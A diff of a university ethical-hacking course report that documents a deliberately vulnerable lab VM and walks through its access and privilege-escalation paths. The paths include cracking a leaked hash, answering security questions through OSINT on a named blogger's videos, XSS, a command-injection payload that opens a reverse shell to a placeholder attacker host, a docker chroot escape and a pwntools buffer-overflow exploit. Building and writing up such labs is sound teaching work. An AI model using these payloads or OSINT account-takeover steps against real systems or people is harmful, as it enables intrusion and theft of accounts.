@@ -12,11 +12,9 @@ Group <code>0xe</code> - Salvatore Busiello, Nicholas Montana, Alex Parri
 
 ---
 
-This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri of the Academic Year 23/24.
+This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri of the Academic Year 23/24 at Sapienza University of Rome.
 
-We were instructed to design a virtual machine (VM) containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different scenarios on how to obtain remote access and finally escalate privileges to root users.
-
-This very report contains exactly that.
+We were instructed to design a virtual machine (VM) containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.
 
 <h1>Table of contents</h1>
 
@@ -33,33 +31,38 @@ This very report contains exactly that.
   - [🟢 Easy path](#-easy-path-1)
   - [🟠 Medium path](#-medium-path-1)
   - [🔴 Hard path](#-hard-path-1)
-- [Summary](#summary)
+- [How it's made - Machine](#how-its-made---machine)
 
 # Machine specifications
 ## Context
-VC0RP presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" that talks about being vegan and saving the planet.
+vC0rp presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" that talks about being vegan and saving the planet.
 
-But here's the twist: secretly, VC0RP is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market.
+But here's the twist: secretly, vC0rp is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market.
 
 In their offices, top bosses are always coming up with sneaky plans to keep their illegal business going. They bend the rules and bribe people to stay under the radar. It's a two-faced operation – they say one thing in public but do the opposite in private.
 
-As their secret starts to leak out, VC0RP finds itself in big trouble. Will they be exposed for their lies, or will they keep getting away with their deceitful actions?
+As their secret starts to leak out, vC0rp finds itself in big trouble. Will they be exposed for their lies, or will they keep getting away with their deceitful actions?
 
 ## Machine overview
-The machine runs an nginx web server that hosts The Green Crusaders blog. This blog presents some vulnerabilities like cross site scripting, command injection and poor security policies that can be exploited by an attacker to gain remote access. There are some users registered on the blog that are:
-Fabiola Di Sotto aka vegmamy, blog author
-Giorgio Immesi aka ilveganoimbruttito, blog author
-Matteo Ricci, a member of the staff, is currently organizing a protest.
-The machine also runs a ftp server which contains an interesting sql backup. 
+The machine runs an `nginx` web server that hosts The Green Crusaders blog. This blog presents vulnerabilities such as cross site scripting, command injection and other poor security policies that can be exploited by an attacker to gain remote access. 
 
-Behind the scenes, the server runs another web server hosting an hidden web service for the trade of meat. This web service is placed inside docker for security reasons and is not an easy target. There are also some command line interface program in the server file system used internally by the staff to trade meat. This program presents some vulnerabilities that can also be exploited to gain privileged access.
+There are users registered on the blog, being:
+- **Fabiola Di Sotto** aka vegmamy, blog author
+- **Giorgio Immesi** aka ilveganoimbruttito, blog author
+- **Matteo Ricci**, a member of the staff, is currently organizing a protest.
+  
+The machine also runs an `ftp` server which contains an interesting sql backup. 
 
-Below the diagram of the machine with all the services running and a brief description on how to attack them:
+Behind the scenes, the server runs another web server hosting an *hidden* web service for the trade of meat. This web service is placed inside docker for security reasons and is **not an easy target**. 
+
+There are also some command line interface programs in the server's file system used internally by the staff to trade meat. This program presents some vulnerabilities that can also be exploited to gain privileged access.
+
+Below is shown a diagram of the machine with all the services running and a brief description on how to attack them:
 
 ![Machine diagram](images/diagram.jpg)
 
 # Obtaining remote access
-First things first, when a penetration tester has a machine, the first thing they have to do is scanning, therefore we run a quick and easy `nmap` towards the machine itself
+First things first, when a penetration tester has a machine, the first thing they should do is scanning, therefore we run a quick and easy `nmap` towards the machine itself
 ```sh
 $ nmap -sS -O <machine_ip>
 ```
@@ -89,17 +92,18 @@ Now we have every single ingredient for our remote access adventure, of which we
 ## 🟢 Easy path
 From the scanning, we can notice that there is an ftp server running. We should also notice by probing the authentication mechanism of the ftp server that it allows anonymous authentication. The landing directory will contain two files called `leavemehere.txt`, which contains some information for the login page, and the `sql_backup.zip` that contains the user table backup of the vegan blog. 
 
-We have to download the backup and read the clear-text credentials from it to login. In this backup there is only one user currently active in the blog and is Matteo Ricci. We can now login as Matteo Ricci, a not so expert staff member of VC0RP. He is currently organizing a protest and published the private key of the server! This private key can be used to login with ssh on the machine.
+We have to download the backup and read the clear-text credentials from it to login. In this backup there is only one user currently active in the blog and is Matteo Ricci. We can now login as Matteo Ricci, a not so expert staff member of vC0rp. He is currently organizing a protest and published the private key of the server! This private key can be used to login with ssh on the machine.
 
 ## 🟠 Medium path 
 
-As previously said, VC0RP runs a popular blog, "The Green Crusaders", which can be accessed at `/blog` 
+As previously said, vC0rp runs a popular blog, "The Green Crusaders", which can be accessed at `/blog` 
 
 ![The Green Crusaders Blog](images/tgc/blog.png)
 
 The blog will contain articles centered around veganism and such. We can see that there are two main authors:
-Fabiola di Sotto
-Giorgio Immesi
+1. Fabiola di Sotto
+2. Giorgio Immesi
+   
 Let’s inform ourselves about veganism a little more by checking any blog post, for instance:
 ```sh
 /blog/compassionate-future-rethinking-relationship-food-nature
@@ -108,26 +112,29 @@ Which will look like so:
 
 ![A page from The Green Crusaders Blog](images/tgc/article.png)
 
-Let’s click onto the name of the author itself, which will lead to the following page:
+Let’s click onto the name of the author itself, in this case Giorgio Immesi, which will lead to the following page:
 ```sh
 /blog/author/ilveganoimbruttito
 ```
 So far, we’ve understood that his username is `ilveganoimbruttito` he is a post author. Now we could try to ask for a password reset, using above username, which will succeed in Step 1.
 
-Then, as Step 2, we will get asked 3 security questions… which we will have to answer all
-Which year have you become vegan?
-Which day were you born?
-In which town have you attended elementary school?
-Well, we can try googling Giorgio Immesi, and from a very quick search we can notice that he is a famous Italian vegan blogger and activist, who owns
-An instagram account
-A YouTube account
-A TikTok account
-Famous people usually tend to leave too much information about their life online… will this be their demise in this case?
+Then, as Step 2, we will get asked 3 security questions… which we will have to answer all:
+1. `Which year have you become vegan?`
+2. `Which day were you born?`
+3. `In which town have you attended elementary school?`
 
-Indeed, because we can answer all three questions with a little bit of OSINT work:
-YouTube video from his main channel: ‘PERCHE' SONO VEGANO : Tutta la VERITA' - Video di Giorgio Immesi’ @ 440s - Answer: `2015`
-YouTube video from his main channel: ‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’ @ 45s - Answer: `10th December`
-YouTube video from his main channel: ‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’ @ 159s - Answer: `Santilario`
+Well, we can try googling Giorgio Immesi, and from a very quick search we can notice that he is a famous Italian vegan blogger and activist... who owns
+- An instagram account
+- A YouTube account
+- A TikTok account
+  
+Famous people usually tend to leave *too much* information about their life online… will this be their demise in this case?
+
+Indeed, because we can answer all three questions with a little bit of **OSINT** work: 
+1. [‘PERCHE' SONO VEGANO : Tutta la VERITA' - Video di Giorgio Immesi’](https://www.youtube.com/watch?v=EXITzZ9L5xI&t=440s) - Answer: `2015`
+2. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=45s) - Answer: `10th December`
+3. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=159s) - Answer: `Santilario`
+
 By inputting the above answers, we will get output the hash of the password, which is the following string
 ```sh
 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
@@ -136,12 +143,12 @@ Which is sent to the following email address:
 ```sh
 ilveganoimbruttito@greencrusaders.0xe
 ```
-Now we check which kind of algorithm output the above hash, which can be done with any online or offline tool, in this case we can use hash-analyzer in the following way:
+Now we check which kind of algorithm output the above hash, which can be done with any online or offline tool, in this case we can use `hash-identifier` in the following way:
 ```sh
-$ hash-analyzer 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
+$ hash-identifier 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
 ```
 We will get told that the most probable candidate is SHA256, which is pretty secure… right?
-![Hash analyzer](images/tgc/medium/kali_hash_identifier.png)
+![Hash identifier](images/tgc/medium/kali_hash_identifier.png)
 
 You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist:
 ```sh
@@ -159,7 +166,7 @@ ilveganoimbruttito@greencrusaders.0xe
 ```
 And we’re in as blog author!
 
-Note: the same could be done with blog author ‘Fabiola di Sotto’, whose username is `vegmamy`. In her case, everything is available on her Instagram account.
+**Note**: the same could be done with blog author ‘Fabiola di Sotto’, whose username is `vegmamy`. In her case, everything is available on her Instagram account.
 
 ### Exploit
 Once entered as author of the blog, from the bottom of the profile page of the user we can access the `/YWRtaW4K/dashboard` which displays info on the posts of the user. 
@@ -188,9 +195,10 @@ To exploit the hard path we have to take the same steps of the medium path, so w
 However, we don’t have complete control over what we post, as upon pressing ‘post article’, our post will have to be checked by an administrator for approval… boring!
 
 ![Publishing new posts](images/tgc/medium/article_processing.png)
+After a **painful** wait, we will have our post published. Hooray…? Indeed, because when it comes to posts and possible vulnerabilities, the first one that will come into our mind is cross site scripting.
 
-After a painful wait, we will have our post published. Hooray…? Indeed, because when it comes to posts and possible vulnerabilities, the first one that will come into our mind is cross site scripting.
 ![New post is submitted](images/tgc/medium/article_submitted.png)
+
 ### Exploit
 
 The post submission process does not check and validate user input automatically so cross site scripting is possible which we can double check that by posting a post with the following input
@@ -253,7 +261,7 @@ If we inject the following payload
 # Privilege escalation
 Once remote access has been obtained, the penetration tester can look to escalate privileges in order to completely exploit the machine and gather all kinds of information they were not supposed to.
 
-As instructed, there are three different ways to achieve privilege escalation
+As instructed, there are three different ways to achieve privilege escalation:
 
 ## 🟢 Easy path
 In the home directory of the *saltbae* user there is a C executable called `shadow-butchers-client` that is used by the people hosting the website to connect to a *super secret black market* for buying meat! This executable has the SETUID bit set and is owned by the root user. It also presents the following features:
@@ -291,19 +299,19 @@ Once we have remote access to the machine, we could start to enumerate it. The e
 ```sh
 ssh -L 9090:localhost:3100 saltbae@192.168.1.151 -i id_rsa
 ```
-To do this though we need the private ssh key which we already have (if we traversed the easy path) or we could just simply create another pair. After that we contact localhost:9090 and we are greeted with a meat store! VC0RP must be into some shady things…
+To do this though we need the private ssh key which we already have (if we traversed the easy path) or we could just simply create another pair. After that we contact `localhost:9090` and we are greeted with a meat store! vC0rp must be into some shady things…
 
 We start to play with the website until we find the `/resellers` page. This page presents a search bar used to find meat resellers in the world. This search bar presents yet another command injection vulnerability. With the following payload we spawn a reverse shell:
 ```sh
 “; nc <attacker_machine>:<port> -e /bin/sh %23
 ```
-Once we enter things seem a little odd… We realize that we are not in the system, but in a container. A privileged container! So we can mount the server filesystem on the docker container and act as the root of the server:
+Once we enter things seem a little odd… We realize that we are not in the system, but in a container, a privileged container! We can mount the server's filesystem on the docker container and act as the root of the server:
 ```sh
 chroot /host sh
 ```
 
 ## 🔴 Hard path
-The same `shadow-butchers-client` executable in the *saltbae* home is vulnerable to a buffer overflow. The buffer overflow is exploitable from the *order meat from suppliers* option. The program will ask the user to input the name of the supplier he wants to buy the meat from. This string is copied to a buffer wihtout checking the length. Since the machine does not have ASLR active and the executable was compiled with executable stack and with no canaries the exploitation is pretty straight forward.
+The same `shadow-butchers-client` executable in the *saltbae* home is vulnerable to a buffer overflow. The buffer overflow is exploitable from the *order meat from suppliers* option. The program will ask the user to input the name of the supplier he wants to buy the meat from. This string is copied to a buffer without checking the length. Since the machine does not have ASLR active and the executable was compiled with executable stack and with no canaries the exploitation is pretty straight forward.
 
 We tested the following python exploit written using the *pwntools* library:
 ```py
@@ -332,7 +340,6 @@ io.sendline(payload)
 io.interactive()
 ```
 This indeed spawns a root shell.
-# Summary
-In conclusion, we've seen how to obtain remote access and privilege escalation on our VM, ranging from easy to hard.
 
-The following image sums up all the possible available paths inserted in our application
+# How it's made - Machine
+Here we will say how the machine was built
